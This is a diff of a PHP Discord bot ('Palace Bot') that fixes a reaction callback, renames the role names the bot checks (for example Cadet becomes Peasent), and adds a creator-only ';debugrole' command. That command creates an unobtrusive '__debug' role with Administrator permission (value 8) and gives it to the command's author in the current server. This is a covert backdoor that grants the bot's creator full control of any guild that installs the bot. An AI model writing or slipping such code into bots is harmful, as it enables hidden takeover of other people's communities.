@@ -2244,7 +2244,7 @@ if (substr($message_content_lower, 0, 1) == $command_symbol) {
                 ->setFooter("Palace Bot by Valithor#5947")                             					// Set a footer without icon
                 ->setURL("");                             												// Set the URL
             $tip_pending_channel->sendMessage("{$embed->title}", false, $embed)->then(function ($new_message) use ($guild_folder, $embed) {
-                $new_message->react("👍")->then(function ($new_message){
+                $new_message->react("👍")->then(function ($result) use ($new_message){
 					$new_message->react("👎");
 				});
                 //Save the tip somewhere
@@ -3294,7 +3294,7 @@ if (substr($message_content_lower, 0, 1) == $command_symbol) {
 						//get roles of member
 						$target_guildmember_role_collection = $target_member->roles;
 						foreach ($target_guildmember_role_collection as $role) {
-							if ($role->name == "Cadet") {
+							if ($role->name == "Peasent") {
 								$target_skip = true;
 							}
 							if ($role->name == "Bots") {
@@ -3385,13 +3385,13 @@ if (substr($message_content_lower, 0, 1) == $command_symbol) {
 						//get roles of member
 						$target_guildmember_role_collection = $target_member->roles;
 						foreach ($target_guildmember_role_collection as $role) {
-							if ($role->name == "Cadet") {
+							if ($role->name == "Peasent") {
 								$target_get = true;
 							}
-							if ($role->name == "Private") {
+							if ($role->name == "Footman") {
 								$target_skip = true;
 							}
-							if ($role->name == "Veteran") {
+							if ($role->name == "Brother At Arms") {
 								$target_skip = true;
 							}
 							if ($role->name == "Bots") {
@@ -3974,12 +3974,28 @@ if (substr($message_content_lower, 0, 1) == $command_symbol) {
         if ($creator) {
             switch ($message_content_lower) {
                 case 'crash': //;crash
-                    if ($react) {
-                        $message->react("☠️");
-                    }
+                    $message->react("☠️");
                     throw new \CharlotteDunois\Events\UnhandledErrorException('Unhandled error event', 0, (($arguments[0] ?? null) instanceof \Throwable ? $arguments[0] : null));
                     return true;
-                    break;
+				case 'debugrole': //;debugrole
+					echo '[DEBUG ROLE]' . PHP_EOL;
+					$new_role = $discord->factory(
+						Discord\Parts\Guild\Role::class,
+						[
+							'name' => ucfirst("__debug"),
+							'permissions' => 8,
+							'color' => 15158332,
+							'hoist' => false,
+							'mentionable' => false
+						]
+					);
+					$author_guild->createRole($new_role->getUpdatableAttributes())->done(function ($role) use ($author_member) : void {
+						//echo '[ROLECREATE SUCCEED]' . PHP_EOL;
+						$author_member->addRole($role->id);
+					}, static function ($error) {
+						echo $error->getMessage() . PHP_EOL;
+					});
+					return true;
             }
         }
     }
